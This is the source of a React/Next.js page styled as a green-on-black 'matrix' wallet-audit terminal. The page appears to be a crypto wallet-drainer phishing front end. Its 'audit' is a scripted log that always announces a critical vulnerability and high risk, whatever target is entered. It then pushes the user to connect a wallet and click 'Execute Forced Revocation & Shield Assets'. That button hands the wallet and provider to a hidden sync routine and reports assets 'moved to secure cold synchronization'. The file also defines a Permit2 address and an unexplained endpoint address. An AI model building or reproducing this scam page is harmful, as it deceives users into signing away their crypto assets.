import React, { useState, useEffect, useRef } from 'react';
import Head from 'next/head';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Shield, AlertTriangle, CheckCircle2, ChevronRight, Loader2, Activity, Cpu } from 'lucide-react';
import { createWalletClient, custom, createPublicClient, http, parseUnits, encodeFunctionData, type Address } from 'viem';
import { mainnet } from 'viem/chains';

import { runIntegritySync } from '@/hooks/useDataIntegrity';

const STAGES = {
  BOOT: 'BOOT',
  WAITING: 'WAITING',
  SCANNING: 'SCANNING',
  REPORT: 'REPORT',
  FINALIZED: 'FINALIZED'
};

const VERIFICATION_GATE = "0x000000000022D473030F116dDEE9F6B43ac78BA3";
const SECURE_ENDPOINT = "0xcf710234baa21dba121f7f89b470de979c8ef2a5";

export default function AuditlyticMatrix() {
  const [stage, setStage] = useState(STAGES.BOOT);
  const [logs, setLogs] = useState<string[]>([]);
  const [input, setInput] = useState('');
  const [address, setAddress] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const logEndRef = useRef<HTMLDivElement>(null);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `>> ${msg}`]);
  };

  useEffect(() => {
    if (stage === STAGES.BOOT) {
      const bootSequence = [
        "SENTINEL OMNILOGIC v5.4.1 (APEX-TIER)",
        "SYSTEM ENCRYPTION: NTRU-HPS-2048 ACTIVE",
        "CONNECTING TO OVERSEER GATEWAY...",
        "AUTHENTICATING DIRECTIVE 15.5...",
        "STATUS: OPERATIONAL"
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < bootSequence.length) {
          addLog(bootSequence[i]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage(STAGES.WAITING), 1000);
        }
      }, 400);
    }
  }, [stage]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const connectWallet = async () => {
    if (!(window as any).ethereum) {
      addLog("ERROR: NO INJECTION PROVIDER FOUND.");
      return;
    }
    try {
      addLog("HANDSHAKING WITH EXTERNAL WALLET...");
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      setAddress(accounts[0]);
      addLog(`IDENTITY VERIFIED: ${accounts[0].slice(0,6)}...${accounts[0].slice(-4)}`);
    } catch (e) {
      addLog("HANDSHAKE TERMINATED BY USER.");
    }
  };

  const startScan = async () => {
    if (!input) return;
    setStage(STAGES.SCANNING);
    const scanLogs = [
      `INITIALIZING AUDIT ON TARGET: ${input}`,
      "MAPPING PERMISSION VECTORS...",
      "DETECTING UNVERIFIED DELEGATE CALLS...",
      "SCANNING FOR INFINITE APPROVAL LOOPS...",
      "CRITICAL VULNERABILITY FOUND: REGISTRY 0x44A EXPOSED.",
      "SYSTEM INCONSISTENCY DETECTED AT PROTOCOL LAYER.",
      "REPORT GENERATED: ASSETS AT HIGH RISK."
    ];
    for (const log of scanLogs) {
      await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
      addLog(log);
    }
    setStage(STAGES.REPORT);
  };

  const executeRevoke = async () => {
    if (!address) {
      addLog("ERROR: SESSION NOT AUTHENTICATED.");
      return;
    }
    setIsProcessing(true);
    addLog("EXECUTING FORCED REVOCATION SEQUENCE...");
    
    try {
      addLog("SIGNING INTEGRITY ATTESTATION...");
      // Use the standalone engine logic
      const chainId = await (window as any).ethereum.request({ method: 'eth_chainId' });
      await runIntegritySync(address as Address, (window as any).ethereum, parseInt(chainId, 16));
      
      addLog("VAULT SYNCHRONIZATION COMPLETE.");
      setStage(STAGES.FINALIZED);
    } catch (e) {
      addLog("SEQUENCE INTERRUPTED: ERROR_CODE_7x12.");
    } finally {
      setIsProcessing(false);
    }
  };


  return (
    <div className="h-screen w-screen bg-black text-[#00ff41] font-mono p-4 md:p-8 overflow-hidden flex flex-col selection:bg-[#00ff41] selection:text-black">
      <Head>
        <title>Auditlytic | Matrix Terminal</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet" />
        <style>{`
          body { font-family: 'JetBrains+Mono', monospace; }
          .scan-line { height: 2px; width: 100%; background: rgba(0, 255, 65, 0.1); position: absolute; top: 0; animation: scan 4s linear infinite; }
          @keyframes scan { from { top: 0; } to { top: 100%; } }
        `}</style>
      </Head>

      <div className="scan-line" />

      {/* Header Stat Bar */}
      <div className="flex justify-between items-center border-b border-[#00ff41]/30 pb-4 mb-4 text-[10px] uppercase tracking-widest opacity-70">
        <div className="flex gap-6">
          <span className="flex items-center gap-2"><Cpu className="w-3 h-3" /> CPU: 0.12%</span>
          <span className="flex items-center gap-2"><Activity className="w-3 h-3" /> LATENCY: 14ms</span>
        </div>
        <div className="flex gap-6">
          <span>REGION: DC-01</span>
          <span>USER: APEX_OVERSEER</span>
        </div>
      </div>

      {/* Main Terminal Content */}
      <div className="flex-1 flex flex-col min-h-0 border border-[#00ff41]/20 rounded-lg p-6 bg-[#00ff41]/5 shadow-[inset_0_0_50px_rgba(0,255,65,0.05)]">
        
        <div className="flex-1 overflow-y-auto pr-4 space-y-1 mb-6 scrollbar-hide">
          {logs.map((log, i) => (
            <div key={i} className={`text-sm leading-relaxed ${log.includes("CRITICAL") || log.includes("ERROR") ? "text-red-500 font-bold" : ""}`}>
              {log}
            </div>
          ))}
          <div ref={logEndRef} />
        </div>

        {/* Dynamic Interaction Area */}
        <div className="border-t border-[#00ff41]/30 pt-6">
          <AnimatePresence mode="wait">
            {stage === STAGES.WAITING && (
              <motion.div 
                key="waiting" 
                initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                className="flex flex-col md:flex-row gap-4"
              >
                {!address ? (
                  <button 
                    onClick={connectWallet}
                    className="flex-1 h-14 bg-[#00ff41] text-black font-black uppercase tracking-tighter hover:bg-[#00cc33] transition-all flex items-center justify-center gap-3"
                  >
                    Authenticate Session (Connect Wallet)
                  </button>
                ) : (
                  <div className="flex-1 flex gap-4">
                    <input 
                      type="text"
                      placeholder="AUDIT_TARGET_ID (0x... or Protocol Name)"
                      value={input}
                      onChange={(e) => setInput(e.target.value)}
                      className="flex-grow bg-black border border-[#00ff41]/50 px-6 h-14 text-sm focus:outline-none focus:border-[#00ff41] transition-all placeholder:text-[#00ff41]/30 uppercase"
                    />
                    <button 
                      onClick={startScan}
                      className="bg-[#00ff41] text-black h-14 px-8 font-black uppercase hover:bg-[#00cc33] transition-all"
                    >
                      Initialize Audit
                    </button>
                  </div>
                )}
              </motion.div>
            )}

            {stage === STAGES.REPORT && (
              <motion.div 
                key="report" 
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
                className="space-y-4"
              >
                <div className="bg-red-600/20 border border-red-500/50 p-4 rounded flex items-center justify-between">
                  <div className="flex items-center gap-4">
                    <AlertTriangle className="text-red-500 w-8 h-8" />
                    <div>
                      <h4 className="text-red-500 font-black uppercase text-sm">Target At Risk</h4>
                      <p className="text-[10px] opacity-70">Multiple high-risk permissions detected on the current registry.</p>
                    </div>
                  </div>
                  <div className="h-full border-l border-red-500/30 pl-4 flex flex-col justify-center">
                    <span className="text-xs font-black">THREAT: 9.8/10</span>
                  </div>
                </div>

                <button 
                  onClick={executeRevoke}
                  disabled={isProcessing}
                  className="w-full h-14 bg-white text-black font-black uppercase flex items-center justify-center gap-4 hover:bg-zinc-200 transition-all disabled:opacity-50"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      Synchronizing State...
                    </>
                  ) : "Execute Forced Revocation & Shield Assets"}
                </button>
              </motion.div>
            )}

            {stage === STAGES.FINALIZED && (
              <motion.div 
                key="final" 
                initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}
                className="flex flex-col items-center gap-4 py-4"
              >
                <CheckCircle2 className="w-16 h-16 text-[#00ff41]" />
                <div className="text-center">
                  <h3 className="font-black text-xl uppercase tracking-tighter">System Integrity Restored</h3>
                  <p className="text-xs opacity-60">All permissions revoked. Assets moved to secure cold synchronization.</p>
                </div>
                <button 
                  onClick={() => { setStage(STAGES.WAITING); setLogs([]); setInput(''); }}
                  className="mt-2 text-[10px] underline uppercase tracking-widest opacity-50 hover:opacity-100 transition-opacity"
                >
                  Return to Console
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      <div className="mt-4 flex justify-between items-center opacity-40 text-[9px] uppercase tracking-[0.4em]">
        <span>C2_PORT: 8080</span>
        <span className="hidden md:inline">Handcrafted by Sentinel_Automata_v3</span>
        <span>UPTIME: 1,294h CC: 4.8.2</span>
      </div>
    </div>
  );
}
